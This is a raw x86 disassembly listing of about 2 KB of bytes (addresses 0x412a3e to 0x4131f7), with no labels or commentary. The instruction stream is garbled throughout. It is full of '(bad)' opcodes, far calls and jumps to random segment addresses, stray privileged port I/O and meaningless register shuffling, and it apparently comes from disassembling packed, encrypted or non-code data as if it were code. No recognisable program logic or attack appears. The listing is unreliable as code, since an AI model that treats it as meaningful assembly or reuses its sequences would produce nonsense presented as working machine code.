  412a3e:	mov    edx,0xb2dab2cb
  412a43:	repz rcl BYTE PTR [esi+esi*4],cl
  412a47:	or     esi,DWORD PTR [ebx+0x32969cda]
  412a4d:	pop    ebx
  412a4e:	push   ebx
  412a4f:	lahf   
  412a50:	adc    eax,0x62b2eaae
  412a55:	les    edi,FWORD PTR [edi+0x196c2a05]
  412a5b:	es jl  0x412ac2
  412a5e:	mov    ds:0x75732e18,eax
  412a63:	xchg   edx,eax
  412a64:	repnz dec edx
  412a66:	xchg   edi,eax
  412a67:	push   eax
  412a68:	test   eax,0xe27cb24c
  412a6d:	push   cs
  412a6e:	sar    BYTE PTR [edi],0xcb
  412a71:	loope  0x412a25
  412a73:	leave  
  412a74:	pop    ss
  412a75:	fild   DWORD PTR [edi]
  412a77:	adc    DWORD PTR [edi-0x60],ebx
  412a7a:	scas   eax,DWORD PTR es:[edi]
  412a7b:	adc    BYTE PTR [eax],dl
  412a7d:	fsub   QWORD PTR [ebp+0x6f336d29]
  412a83:	sbb    ebp,DWORD PTR [edi-0x36]
  412a86:	jmp    0xd1022e20
  412a8b:	mov    edi,DWORD PTR [ebx-0x21de0e39]
  412a91:	int3   
  412a92:	sub    esp,ebx
  412a94:	xchg   edi,eax
  412a95:	shl    DWORD PTR [edi],1
  412a97:	pop    eax
  412a98:	pop    es
  412a99:	(bad)  
  412a9a:	cmc    
  412a9b:	mov    eax,ds:0xf00fd09f
  412aa0:	adc    BYTE PTR [edx+0x551bc800],bh
  412aa6:	test   eax,0x78012db2
  412aab:	cld    
  412aac:	add    ebp,ebp
  412aae:	(bad)  
  412aaf:	data16 mov ah,0x42
  412ab2:	mov    WORD PTR gs:[edi-0x361fe4fd],fs
  412ab9:	in     al,dx
  412aba:	mov    dl,0x2c
  412abc:	repnz arpl WORD PTR [edx],cx
  412abf:	(bad)  
  412ac1:	inc    eax
  412ac2:	dec    ebp
  412ac3:	out    0x90,al
  412ac5:	das    
  412ac6:	cmp    DWORD PTR [ecx],esp
  412ac8:	sbb    DWORD PTR [ecx-0xd],esi
  412acb:	data16 jae 0x412ae8
  412ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412acf:	mov    esp,?
  412ad1:	and    edx,DWORD PTR [ebx+0x75bb818d]
  412ad7:	and    DWORD PTR [eax-0x43],0x227f26e2
  412ade:	loopne 0x412b08
  412ae0:	cli    
  412ae1:	(bad)  
  412ae2:	ret    
  412ae3:	and    ecx,DWORD PTR [ebp+0x61]
  412ae6:	or     ah,BYTE PTR [edi-0x2205d24b]
  412aec:	jmp    0x412b51
  412aee:	(bad)  
  412aef:	loop   0x412b69
  412af1:	push   ebp
  412af2:	dec    edx
  412af3:	xchg   edx,eax
  412af4:	mov    ch,ch
  412af6:	daa    
  412af7:	cmp    edi,ecx
  412af9:	cdq    
  412afa:	or     al,0x48
  412afc:	cmp    edi,DWORD PTR [ebp-0x44]
  412aff:	inc    eax
  412b00:	mov    DWORD PTR [ebp-0x40],edx
  412b03:	jmp    DWORD PTR [esi]
  412b05:	push   edx
  412b06:	mov    ds:0x31ebde64,eax
  412b0b:	aad    0x5b
  412b0d:	mov    ebx,0x74226bb9
  412b12:	cmc    
  412b13:	push   ss
  412b14:	mov    WORD PTR [edx-0x115a3d66],?
  412b1a:	call   0x7c3918
  412b1f:	fnstsw ax
  412b21:	add    esi,ebp
  412b23:	jecxz  0x412b52
  412b25:	add    BYTE PTR [ebx+0x79a4dd87],0x30
  412b2c:	fwait
  412b2d:	in     al,0x6d
  412b2f:	mov    WORD PTR [esi-0x75510c6d],es
  412b35:	jnp    0x412b40
  412b37:	mov    DWORD PTR [edx-0x7ed796c5],esi
  412b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b3e:	mov    dl,0x25
  412b40:	pushf  
  412b41:	pop    edx
  412b42:	shl    DWORD PTR [edi-0x34f7c68b],1
  412b48:	icebp  
  412b49:	jno    0x412b58
  412b4b:	loope  0x412b54
  412b4d:	call   0x4089:0x8104045d
  412b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b55:	and    ecx,DWORD PTR [ebp+0x3628d4e2]
  412b5b:	out    0xcd,eax
  412b5d:	popf   
  412b5e:	xchg   edi,eax
  412b5f:	test   al,0xb6
  412b61:	sti    
  412b62:	xlat   BYTE PTR ds:[ebx]
  412b63:	das    
  412b64:	shr    DWORD PTR [esi],0xaa
  412b67:	mov    WORD PTR [ebx-0xb4ab39e],gs
  412b6d:	mov    bl,0x23
  412b6f:	das    
  412b70:	dec    edx
  412b71:	mov    edx,0x361a00d6
  412b76:	inc    eax
  412b77:	std    
  412b78:	mov    ebx,ebx
  412b7a:	lock inc ebp
  412b7c:	xchg   ebx,eax
  412b7d:	mov    al,ds:0x4731dff6
  412b82:	or     cl,BYTE PTR [esi]
  412b84:	xchg   ebp,eax
  412b85:	lahf   
  412b86:	retf   
  412b87:	add    al,0x86
  412b89:	cdq    
  412b8a:	sub    edx,esp
  412b8c:	aas    
  412b8d:	add    eax,DWORD PTR [edx+0x1bbcecc5]
  412b93:	xchg   edx,eax
  412b94:	mul    DWORD PTR [ecx-0xb847d41]
  412b9a:	test   eax,0x4beeb899
  412b9f:	leave  
  412ba0:	mov    bl,0xbd
  412ba2:	mov    eax,ds:0x96f2c63e
  412ba7:	aad    0xe0
  412ba9:	imul   edi,DWORD PTR [ecx],0x1d
  412bac:	clc    
  412bad:	cmp    ch,BYTE PTR [ebp-0x1d]
  412bb0:	pushf  
  412bb1:	xor    ah,0xbc
  412bb4:	and    bh,BYTE PTR [esp+eax*1+0x46]
  412bb8:	dec    eax
  412bb9:	jno    0x412bd1
  412bbb:	scas   al,BYTE PTR es:[edi]
  412bbc:	add    eax,0xb1dd6ead
  412bc1:	xchg   edi,ebp
  412bc3:	ret    0x1a68
  412bc6:	mov    dh,0x43
  412bc8:	or     dh,cl
  412bca:	inc    ecx
  412bcb:	xchg   ecx,eax
  412bcc:	cmp    esp,DWORD PTR [esp+edx*4-0x38b7c7c9]
  412bd3:	add    eax,0xa669a8e
  412bd8:	pushf  
  412bd9:	je     0x412c04
  412bdb:	das    
  412bdc:	push   0x65
  412bde:	xor    edx,0xffffffd0
  412be1:	aad    0xb5
  412be3:	mov    ecx,0x5c975d8e
  412be8:	cmp    dh,ah
  412bea:	cld    
  412beb:	dec    edx
  412bec:	inc    ebx
  412bed:	xor    DWORD PTR ds:0x1ffee9bb,ebp
  412bf3:	xchg   edi,eax
  412bf4:	dec    ecx
  412bf5:	pop    ss
  412bf6:	shl    bh,cl
  412bf8:	sbb    al,0x1c
  412bfa:	and    DWORD PTR [edi-0x55],esi
  412bfd:	in     al,dx
  412bfe:	pop    ebp
  412bff:	retf   
  412c00:	cwde   
  412c01:	fsubr  QWORD PTR [ecx-0x32]
  412c04:	aad    0xec
  412c06:	jle    0x412c3c
  412c08:	sti    
  412c09:	pop    ebx
  412c0a:	xchg   DWORD PTR [ebx],edx
  412c0c:	cmp    edi,DWORD PTR [ebx+0x1c5547fa]
  412c12:	call   0x1ffa:0x4a729db1
  412c19:	and    dl,BYTE PTR [esi-0x2b]
  412c1c:	repz popa 
  412c1e:	fldenv [ebx+0x6d824226]
  412c24:	popf   
  412c25:	mov    esp,0x13a717ee
  412c2a:	lock mov edx,0xaf63ee48
  412c30:	mov    ebp,0x7aac7c31
  412c35:	jnp    0x412c35
  412c37:	dec    ebx
  412c38:	pusha  
  412c39:	mov    bh,0x63
  412c3b:	inc    esi
  412c3c:	or     dl,dl
  412c3e:	push   esi
  412c3f:	xchg   esi,eax
  412c40:	les    esp,FWORD PTR [eax-0x20]
  412c43:	jmp    0x9be4:0x77563e0
  412c4a:	mov    DWORD PTR [edx+0x52],esi
  412c4d:	test   dl,dl
  412c4f:	ret    
  412c50:	in     eax,dx
  412c51:	popf   
  412c52:	mov    esp,0xd054ca9
  412c57:	es mov eax,0x84753246
  412c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c5e:	push   cs
  412c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c60:	xchg   ebx,eax
  412c61:	fidivr DWORD PTR [di-0x2321]
  412c66:	push   ebp
  412c67:	leave  
  412c68:	jae    0x412c0b
  412c6a:	pop    esi
  412c6b:	std    
  412c6c:	adc    al,0xc5
  412c6e:	or     ch,dl
  412c70:	sub    DWORD PTR [edx-0x3cc509cf],ebx
  412c76:	xor    al,0x91
  412c78:	sti    
  412c79:	add    ecx,DWORD PTR ds:0x90283496
  412c7f:	xchg   ebp,eax
  412c80:	and    cl,BYTE PTR [ebx+0x70]
  412c83:	(bad)  [eax+0x57]
  412c86:	xchg   ecx,eax
  412c87:	mov    dh,0x4
  412c89:	mov    edx,0xf72a2c56
  412c8e:	xchg   edx,eax
  412c8f:	sbb    DWORD PTR [edx-0x21],esp
  412c92:	lock push ds
  412c94:	mov    ds:0x5ac2336d,eax
  412c99:	(bad)  
  412c9a:	imul   ecx,esi,0x1df0deb2
  412ca0:	(bad)  
  412ca1:	jb     0x412d10
  412ca3:	cmp    BYTE PTR [edi+edx*4],bh
  412ca6:	retf   
  412ca7:	lods   al,BYTE PTR ds:[esi]
  412ca8:	iret   
  412ca9:	dec    esi
  412caa:	inc    ebp
  412cab:	xor    BYTE PTR [ebx+0x39],al
  412cae:	das    
  412caf:	pop    eax
  412cb0:	inc    esi
  412cb1:	jge    0x412cf0
  412cb3:	dec    ecx
  412cb4:	sub    BYTE PTR [edx+0x25],dl
  412cb7:	adc    esp,ecx
  412cb9:	cmc    
  412cba:	mov    bl,0x45
  412cbc:	enter  0xe79,0x69
  412cc0:	loopne 0x412d28
  412cc2:	outs   dx,DWORD PTR ds:[esi]
  412cc3:	add    ebx,DWORD PTR [edi+0x3c]
  412cc6:	icebp  
  412cc7:	in     al,0xf4
  412cc9:	test   BYTE PTR [ebx+0x6a],0x5f
  412ccd:	inc    esi
  412cce:	jno    0x412c7b
  412cd0:	xchg   BYTE PTR [ebx],dl
  412cd2:	jns    0x412d11
  412cd4:	ror    DWORD PTR [ebp+0x5ecfc0f1],0xf9
  412cdb:	inc    ecx
  412cdc:	fs ja  0x412d42
  412cdf:	adc    edi,DWORD PTR [esi-0x63]
  412ce2:	fsub   QWORD PTR [eax-0x62]
  412ce5:	mov    bh,ch
  412ce7:	add    eax,0xd1485338
  412cec:	xor    edi,ebp
  412cee:	push   es
  412cef:	call   0xce9e69cf
  412cf4:	or     bh,BYTE PTR [ebp+0x5348f7c5]
  412cfa:	xchg   ebp,eax
  412cfb:	dec    edi
  412cfc:	stos   BYTE PTR es:[edi],al
  412cfd:	jl     0x412ce3
  412cff:	pop    es
  412d00:	cmc    
  412d01:	in     eax,dx
  412d02:	in     al,dx
  412d03:	adc    DWORD PTR [esp+ebp*2-0xa66ac21],esp
  412d0a:	or     al,0xaf
  412d0c:	sub    al,0x46
  412d0e:	sub    eax,0xe1f81477
  412d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d14:	jecxz  0x412c97
  412d16:	xchg   DWORD PTR [eax-0x49cd5f9b],eax
  412d1c:	sbb    eax,0x40d900f4
  412d21:	dec    eax
  412d22:	mov    dh,0x87
  412d24:	dec    edi
  412d25:	and    BYTE PTR [ebx],0x81
  412d28:	push   ecx
  412d29:	pavgb  mm3,mm0
  412d2c:	pusha  
  412d2d:	in     al,0x63
  412d2f:	sub    edx,ebx
  412d31:	inc    edi
  412d32:	int3   
  412d33:	mov    bl,0xc7
  412d35:	fwait
  412d36:	shr    BYTE PTR [edx-0x3f179007],cl
  412d3c:	(bad)  
  412d3d:	jmp    0xcd0f:0x19c5d7e7
  412d44:	js     0x412d35
  412d46:	icebp  
  412d47:	mov    ah,0x5f
  412d49:	xchg   ebp,ebx
  412d4b:	mov    eax,0x64bc1ec0
  412d50:	scas   al,BYTE PTR es:[edi]
  412d51:	bound  eax,QWORD PTR [ecx]
  412d53:	and    edi,DWORD PTR [ecx+0x17daf281]
  412d59:	push   edi
  412d5a:	fnstsw WORD PTR [edx+0x9b56527]
  412d60:	sbb    ah,BYTE PTR [ebx+0x6c]
  412d63:	xchg   ebp,eax
  412d64:	push   0xb823854
  412d69:	push   ss
  412d6a:	fdivr  DWORD PTR [ebp-0x5c]
  412d6d:	popf   
  412d6e:	mov    ds:0x6d3e47d1,eax
  412d73:	clc    
  412d74:	mov    eax,ds:0x35291500
  412d79:	imul   ebp,edi,0xffffffc1
  412d7c:	sbb    BYTE PTR [ecx],al
  412d7e:	test   eax,0xdb0e360d
  412d83:	retf   
  412d84:	push   eax
  412d85:	mov    ecx,0x8adab62d
  412d8a:	lods   eax,DWORD PTR ds:[esi]
  412d8b:	xchg   esp,eax
  412d8c:	(bad)  
  412d8d:	jecxz  0x412d63
  412d8f:	push   ds
  412d90:	add    ebp,DWORD PTR [esi+0x65937474]
  412d96:	and    cl,BYTE PTR [eax-0x7a]
  412d99:	mov    ah,BYTE PTR [ecx+esi*4-0x19365f0f]
  412da0:	xor    BYTE PTR [edi-0x6ad95218],0xcc
  412da7:	jmp    0xed10:0xc5fc4d3
  412dae:	mov    edi,0x3bfe412a
  412db3:	test   DWORD PTR [esi-0x5a37fd55],edx
  412db9:	popf   
  412dba:	xor    BYTE PTR [edx+ebx*8+0x49],al
  412dbe:	push   0x2c
  412dc0:	aam    0x3c
  412dc2:	add    DWORD PTR [edi-0x4b4901cd],0x5b
  412dc9:	and    al,dh
  412dcb:	pop    edx
  412dcc:	div    DWORD PTR [ebp+0x29e2a845]
  412dd2:	enter  0x1491,0xe2
  412dd6:	call   0xcbd7:0xfb448a06
  412ddd:	retf   
  412dde:	retf   
  412ddf:	adc    eax,0x379d49ea
  412de4:	lea    esi,[esi+0x2c]
  412de7:	lods   al,BYTE PTR ds:[esi]
  412de8:	push   es
  412de9:	rcr    BYTE PTR [edx],0xdf
  412dec:	bound  edi,QWORD PTR [esi+0x7cb7756d]
  412df2:	and    BYTE PTR [ebx+0x6b],al
  412df5:	mov    ebp,0xf7567a73
  412dfa:	aaa    
  412dfb:	test   DWORD PTR [esi],ecx
  412dfd:	dec    ebx
  412dff:	xor    esp,0x23
  412e02:	call   0xfe42:0x41e64ed3
  412e09:	ffree  st(7)
  412e0b:	sbb    eax,0xe3711450
  412e10:	div    BYTE PTR [ebp-0x5f]
  412e13:	rcl    DWORD PTR [ebx+eax*1+0x33],0xf3
  412e18:	dec    ecx
  412e19:	sub    BYTE PTR [edx-0x53eaaf86],al
  412e1f:	push   0xcbf764f3
  412e24:	jmp    0x412dd3
  412e26:	mov    BYTE PTR [esi],cl
  412e28:	xchg   esp,eax
  412e29:	and    edx,ebx
  412e2b:	(bad)  
  412e2c:	mov    ebp,0xb6fc5c60
  412e31:	cmp    eax,0x44977c22
  412e36:	cdq    
  412e37:	xchg   edx,eax
  412e38:	dec    ecx
  412e39:	sahf   
  412e3a:	sbb    ecx,edi
  412e3c:	retf   
  412e3d:	into   
  412e3e:	mov    eax,0x5d37dead
  412e43:	add    eax,0xd7732ac0
  412e48:	sti    
  412e49:	mov    bl,BYTE PTR [ebx-0x27]
  412e4c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  412e4e:	lock cmc 
  412e50:	and    esp,esp
  412e52:	fdiv   DWORD PTR [edi-0xe]
  412e55:	jb     0x412e3a
  412e57:	call   0x1f85:0x52c0f067
  412e5e:	jmp    0xd5a21dd0
  412e63:	add    BYTE PTR [edi],cl
  412e65:	push   esp
  412e66:	mov    esi,0x29cc0e97
  412e6b:	pop    ss
  412e6c:	add    ah,BYTE PTR ds:0x641fb1c6
  412e72:	pop    ss
  412e73:	or     edx,DWORD PTR ds:0xba355d1e
  412e79:	aad    0x8e
  412e7b:	jae    0x412e53
  412e7d:	mov    dl,BYTE PTR [ecx+eax*4-0x28af3fc5]
  412e84:	bound  ecx,QWORD PTR [edi+0xa]
  412e87:	pop    esp
  412e88:	cmp    al,0x40
  412e8a:	scas   al,BYTE PTR es:[edi]
  412e8b:	mov    cl,0x27
  412e8d:	fmulp  st(2),st
  412e8f:	sub    eax,0x4f352f8b
  412e94:	sub    dl,BYTE PTR [ecx+0x2d]
  412e97:	push   ds
  412e98:	ds (bad) 
  412e9a:	and    esi,DWORD PTR [ebx]
  412e9c:	jmp    0xe8d1:0xe26ac7cc
  412ea3:	hlt    
  412ea4:	push   edi
  412ea5:	add    eax,0xd1bfdafb
  412eaa:	gs (bad) 
  412eac:	(bad)  
  412eae:	mov    ebp,DWORD PTR [esi+0x35c8d077]
  412eb4:	rol    DWORD PTR [ecx-0x31],0x92
  412eb8:	xchg   edx,eax
  412eb9:	and    eax,0xe8eef7ad
  412ebe:	add    ah,0xa7
  412ec1:	lods   al,BYTE PTR ds:[esi]
  412ec2:	or     BYTE PTR [edi+0xd1a0bb7],ch
  412ec8:	add    ah,dl
  412eca:	ja     0x412f3a
  412ecc:	loope  0x412e85
  412ece:	adc    DWORD PTR [ebp-0x1321614e],0x1a
  412ed5:	repnz cmc 
  412ed7:	into   
  412ed8:	jl     0x412e67
  412eda:	fadd   QWORD PTR [edx]
  412edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412edd:	sub    esi,DWORD PTR [ebx+ebp*4]
  412ee0:	xchg   edi,eax
  412ee1:	lods   al,BYTE PTR ds:[esi]
  412ee2:	inc    esp
  412ee3:	jns    0x412e8b
  412ee5:	fxch   st(7)
  412ee7:	les    edx,FWORD PTR [eax+0x1]
  412eea:	jp     0x412ee3
  412eec:	xchg   ebx,eax
  412eed:	sub    DWORD PTR [eax+edx*4-0x76],edi
  412ef1:	ds clc 
  412ef3:	or     edi,DWORD PTR [ecx]
  412ef5:	out    0xea,eax
  412ef7:	mov    esi,0x109ed363
  412efc:	call   0xf00d:0xce8a
  412f02:	pop    esi
  412f03:	lods   al,BYTE PTR ds:[esi]
  412f04:	stos   DWORD PTR es:[edi],eax
  412f05:	rcr    BYTE PTR [ebp-0x12],1
  412f08:	(bad)  
  412f09:	aam    0x91
  412f0b:	or     al,0xd
  412f0d:	lds    esp,FWORD PTR [esi+0x3cfad585]
  412f13:	test   ah,ch
  412f15:	outs   dx,DWORD PTR ds:[esi]
  412f16:	inc    esp
  412f17:	sbb    ebp,eax
  412f19:	mov    ecx,0xe43e9930
  412f1e:	xchg   edx,eax
  412f1f:	and    edi,edx
  412f21:	inc    esi
  412f22:	xchg   edi,eax
  412f23:	adc    eax,0xa2939d06
  412f28:	and    ebp,ecx
  412f2a:	pxor   mm7,QWORD PTR [ecx-0x330d0184]
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	imul   BYTE PTR [ecx+0x2c1ac302]
  412f38:	pop    ds
  412f39:	aaa    
  412f3a:	sub    dh,BYTE PTR [ebx+0x76dd0c79]
  412f40:	sub    al,0xac
  412f42:	nop
  412f43:	imul   eax,ebx,0x31
  412f46:	stos   BYTE PTR es:[edi],al
  412f47:	stos   DWORD PTR es:[edi],eax
  412f48:	push   ebp
  412f49:	dec    esi
  412f4a:	bound  ebx,QWORD PTR [edx-0x56]
  412f4d:	cmp    cl,bl
  412f4f:	sbb    DWORD PTR [ecx],eax
  412f51:	and    al,0x2e
  412f53:	stos   DWORD PTR es:[edi],eax
  412f54:	(bad)  
  412f56:	jmp    0xec687e05
  412f5b:	in     eax,dx
  412f5c:	js     0x412fd5
  412f5e:	xchg   DWORD PTR [ebx+0x4f],esi
  412f61:	call   DWORD PTR [esi-0x69]
  412f64:	inc    ebp
  412f65:	out    0xe,al
  412f67:	loope  0x412f1e
  412f69:	(bad)
  412f6c:	mov    ch,0x16
  412f6e:	loopne 0x412f76
  412f70:	and    eax,0x9da1b409
  412f75:	je     0x412f56
  412f77:	idiv   BYTE PTR [esi-0x3e78476]
  412f7d:	fidiv  WORD PTR [edi]
  412f7f:	and    bh,BYTE PTR [ebx]
  412f81:	mov    al,0x3e
  412f83:	je     0x412fce
  412f85:	mov    eax,ds:0xe3ae1008
  412f8a:	mov    esi,0x2dc9396b
  412f8f:	mov    ebp,0xb8376b98
  412f94:	dec    bh
  412f96:	fwait
  412f97:	mov    cl,0x53
  412f99:	imul   esi,DWORD PTR [edi+0x27],0xd6b81774
  412fa0:	cmc    
  412fa1:	retf   
  412fa2:	fimul  WORD PTR [ecx-0x69]
  412fa5:	cli    
  412fa6:	pop    ebp
  412fa7:	fwait
  412fa8:	or     BYTE PTR [ecx+0x13],dh
  412fab:	dec    ecx
  412fac:	jle    0x412f88
  412fae:	push   edi
  412faf:	(bad)  
  412fb0:	call   0xad3d:0x3e3d2cb6
  412fb7:	xchg   esi,eax
  412fb8:	mov    ah,0x42
  412fba:	cld    
  412fbb:	std    
  412fbc:	inc    ebx
  412fbd:	cwde   
  412fbe:	mov    ds:0xfaa8d152,al
  412fc3:	outs   dx,BYTE PTR ds:[esi]
  412fc4:	or     BYTE PTR [edi+esi*4-0x45f871f7],cl
  412fcb:	popf   
  412fcc:	nop
  412fcd:	sbb    ch,cl
  412fcf:	xchg   BYTE PTR [ebp-0x6d],dh
  412fd2:	xor    ch,ah
  412fd4:	push   ebx
  412fd5:	cmp    eax,0xa9f8960f
  412fda:	xchg   ebx,eax
  412fdb:	push   ebx
  412fdc:	out    dx,eax
  412fdd:	ret    
  412fde:	xchg   esi,eax
  412fdf:	xor    dl,BYTE PTR [edi+0x33]
  412fe2:	pop    edi
  412fe3:	sbb    ebp,DWORD PTR [edi+0x676f3a88]
  412fe9:	lea    esp,[edi+0x5f]
  412fec:	mov    edi,ebp
  412fee:	cmp    eax,0xd58de9e7
  412ff3:	jg     0x41301e
  412ff5:	cmp    BYTE PTR [ecx],0x5d
  412ff8:	pop    edx
  412ff9:	cmp    ebp,DWORD PTR [esi+esi*1]
  412ffc:	add    ch,bl
  412ffe:	mov    dh,0x0
  413000:	(bad)  
  413002:	sub    DWORD PTR [esi-0x52751694],esp
  413008:	and    eax,0x9d30ba0a
  41300d:	dec    eax
  41300e:	dec    esi
  41300f:	loope  0x412fef
  413011:	mov    ebp,0x6bb7edf4
  413016:	mov    bh,0x5f
  413018:	add    edx,DWORD PTR [edx+0x195cdc2a]
  41301e:	sbb    DWORD PTR [ebp+ebx*1-0x5beb08f],edx
  413025:	inc    ebx
  413026:	outs   dx,DWORD PTR ds:[esi]
  413027:	mov    edi,DWORD PTR [edi-0x63f85a7f]
  41302d:	mov    bh,0xc1
  41302f:	xchg   ebp,eax
  413030:	aam    0x6d
  413032:	dec    ebp
  413033:	test   al,0x8d
  413035:	hlt    
  413036:	inc    BYTE PTR [ebp+0x40]
  413039:	adc    al,BYTE PTR [ecx]
  41303b:	popf   
  41303c:	fidivr DWORD PTR [esi]
  41303e:	sahf   
  41303f:	mov    eax,0xb7e65e82
  413044:	btr    DWORD PTR [eax+ebx*2-0x47],edi
  413049:	mov    bh,0x1e
  41304b:	test   DWORD PTR [edi+eiz*4-0x2d7f1ec2],edi
  413052:	std    
  413053:	mov    bh,0x1f
  413055:	pop    ss
  413056:	push   ecx
  413057:	jle    0x41306a
  413059:	ins    BYTE PTR es:[edi],dx
  41305a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41305b:	add    eax,0xe68102ed
  413060:	mov    edi,0xbc032afa
  413065:	mov    ecx,0x4f3eef6a
  41306a:	fimul  WORD PTR [ecx]
  41306c:	dec    ebx
  41306d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41306e:	dec    ebp
  41306f:	pop    edx
  413070:	cwde   
  413071:	cmp    al,0xb9
  413073:	cmp    eax,0xc1d13dc
  413078:	sbb    DWORD PTR [esi+0x75],edx
  41307b:	test   DWORD PTR [esi-0x43],esi
  41307e:	mov    bl,0xa6
  413080:	mov    BYTE PTR [ecx-0x3ccf879],bh
  413086:	dec    ebx
  413087:	pop    esp
  413088:	clc    
  413089:	in     al,dx
  41308a:	pop    edx
  41308b:	imul   esi,DWORD PTR [esi-0xe],0x99c3a14d
  413092:	lahf   
  413093:	fistp  WORD PTR [ecx-0x2b]
  413097:	idiv   BYTE PTR [eax]
  413099:	pop    ebx
  41309a:	inc    ecx
  41309b:	mov    al,0xfc
  41309d:	and    esp,DWORD PTR [esi]
  41309f:	ja     0x41303b
  4130a1:	cli    
  4130a2:	and    BYTE PTR [eax+0x46],dl
  4130a5:	ja     0x41310f
  4130a7:	je     0x413067
  4130a9:	out    dx,al
  4130aa:	push   esp
  4130ab:	mov    ch,0x21
  4130ad:	pop    edi
  4130ae:	dec    ecx
  4130af:	cdq    
  4130b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130b1:	repz xor eax,0x3f226973
  4130b7:	inc    esp
  4130b8:	fwait
  4130b9:	lds    edx,FWORD PTR [eax+0x43f2a0b6]
  4130bf:	jp     0x4130e7
  4130c1:	(bad)  
  4130c2:	iret   
  4130c3:	mov    esp,0x85fec28b
  4130c8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4130ca:	test   al,0xdc
  4130cc:	inc    esp
  4130cd:	out    0x5a,al
  4130cf:	sub    al,BYTE PTR [esi-0x2da36488]
  4130d5:	push   esi
  4130d6:	aad    0x1c
  4130d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130d9:	inc    ebp
  4130da:	sti    
  4130db:	loop   0x41312f
  4130dd:	dec    esi
  4130de:	(bad)  [esi]
  4130e0:	out    0x34,eax
  4130e2:	adc    ecx,DWORD PTR [edi]
  4130e4:	frstor [edx-0x7b]
  4130e7:	in     eax,0x7b
  4130e9:	in     al,dx
  4130ea:	mov    eax,ds:0x78b4a93a
  4130ef:	in     al,0x32
  4130f1:	xor    eax,DWORD PTR [ebx-0x6d]
  4130f4:	dec    edx
  4130f5:	push   edi
  4130f6:	stc    
  4130f7:	jmp    0xc41e:0x62188473
  4130fe:	sbb    dl,BYTE PTR [edx+0x8960d8b]
  413104:	pop    ds
  413105:	leave  
  413106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413107:	adc    BYTE PTR [eax+ebp*1],dl
  41310a:	loope  0x413140
  41310c:	call   0xdbe5:0xb492a784
  413113:	push   es
  413114:	cwde   
  413115:	adc    ebp,eax
  413117:	daa    
  413118:	repnz mov al,0x9b
  41311b:	pop    eax
  41311c:	mov    al,ds:0x92c34049
  413121:	scas   eax,DWORD PTR es:[edi]
  413122:	xchg   esp,eax
  413123:	ja     0x41314f
  413125:	pop    ss
  413126:	sub    BYTE PTR [edx-0x18f1549e],0x7c
  41312d:	and    esi,esp
  41312f:	mov    esi,0xd37fe7e8
  413134:	out    dx,al
  413135:	imul   edi,DWORD PTR [esi],0x39
  413138:	cmp    DWORD PTR [ebx],esp
  41313a:	pop    esi
  41313c:	mov    BYTE PTR [edi],al
  41313e:	cld    
  41313f:	mov    BYTE PTR [edi+0x73],bh
  413142:	loop   0x4130d0
  413144:	repnz adc cl,BYTE PTR [esi+0x26c59f1a]
  41314b:	jnp    0x413171
  41314d:	inc    ebx
  41314e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413150:	nop
  413151:	rcr    ah,1
  413153:	mov    dl,0xb8
  413155:	popa   
  413156:	fadd   QWORD PTR [edi-0x3c2a8af8]
  41315c:	mov    al,0xa7
  41315e:	and    cl,BYTE PTR [ebx-0x3c]
  413161:	aam    0x44
  413163:	xor    al,0xef
  413165:	sbb    eax,0xb0a55238
  41316a:	mov    al,0xa7
  41316c:	inc    ebp
  41316d:	dec    ebp
  41316e:	lock ret 
  413170:	xor    ah,BYTE PTR [ebp-0x2c575dad]
  413176:	int3   
  413177:	xchg   edx,eax
  413178:	stos   DWORD PTR es:[edi],eax
  413179:	pushf  
  41317a:	test   al,0x3
  41317c:	xlat   BYTE PTR ds:[ebx]
  41317d:	adc    DWORD PTR ds:0x3c46e5a4,0x5d76c538
  413187:	lods   al,BYTE PTR ds:[esi]
  413188:	sub    eax,0xea45f0b5
  41318d:	loope  0x413180
  41318f:	jg     0x4131eb
  413191:	bound  esi,QWORD PTR [ebx-0x34]
  413194:	xor    al,BYTE PTR fs:[eax-0x33]
  413198:	cmp    DWORD PTR [eax],edx
  41319a:	ins    DWORD PTR es:[edi],dx
  41319b:	mov    ecx,0xe2bf0a11
  4131a0:	loope  0x4131e1
  4131a2:	mov    edx,0xe10944f8
  4131a7:	mov    esi,0xb0e46733
  4131ac:	scas   al,BYTE PTR es:[edi]
  4131ad:	mov    al,0x90
  4131af:	dec    edx
  4131b0:	push   0xffffffe3
  4131b2:	ins    DWORD PTR es:[edi],dx
  4131b3:	ret    
  4131b4:	test   DWORD PTR [ebx+0x7e4015ab],ecx
  4131ba:	or     eax,ecx
  4131bc:	xchg   ecx,eax
  4131bd:	mov    edi,0x34458fe4
  4131c2:	dec    esi
  4131c3:	xor    DWORD PTR [edi+0x19],edi
  4131c6:	push   0xffffffa8
  4131c8:	inc    eax
  4131c9:	jg     0x413190
  4131cb:	enter  0x2a19,0xff
  4131cf:	neg    DWORD PTR [esp+eiz*2-0x2f]
  4131d3:	lods   eax,DWORD PTR ds:[esi]
  4131d4:	adc    edi,DWORD PTR [ecx-0x6f]
  4131d7:	out    0xf5,eax
  4131d9:	test   eax,0xe072c2
  4131de:	cmc    
  4131df:	jge    0x41325c
  4131e1:	js     0x413259
  4131e3:	cmp    eax,0x34dcc69e
  4131e8:	xor    DWORD PTR [ecx+eiz*1+0x24],ebx
  4131ec:	aaa    
  4131ed:	dec    esi
  4131ee:	xchg   edi,eax
  4131ef:	std    
  4131f0:	dec    ebx
  4131f1:	in     al,0x5d
  4131f3:	lahf   
  4131f4:	rcr    DWORD PTR [ecx],0x6b
  4131f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
